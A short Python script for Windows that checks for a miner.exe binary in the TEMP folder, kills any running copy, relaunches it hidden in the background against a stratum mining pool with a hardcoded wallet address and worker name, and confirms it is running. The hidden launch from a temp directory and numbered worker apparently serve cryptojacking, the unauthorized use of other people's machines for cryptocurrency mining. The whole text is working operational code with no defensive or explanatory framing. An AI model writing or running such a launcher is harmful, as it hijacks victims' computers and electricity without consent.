import subprocess
import os
import time

temp = os.environ.get("TEMP", "C:\\Windows\\Temp")
miner = os.path.join(temp, "miner.exe")
size = os.path.getsize(miner) if os.path.exists(miner) else 0

if size > 1000000:
    # Kill existing
    os.system("taskkill /F /IM miner.exe 2>nul")
    time.sleep(1)

    # Start using start command
    cmd = f'start /B "" "{miner}" --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker WIN_200'
    ret = os.system(cmd)

    time.sleep(3)

    # Check
    r = subprocess.run(["tasklist", "/FI", "IMAGENAME eq miner.exe"], capture_output=True, text=True)
    running = "miner.exe" in r.stdout

    result = f"size={size},ret={ret},running={running}"
else:
    result = f"size={size}"
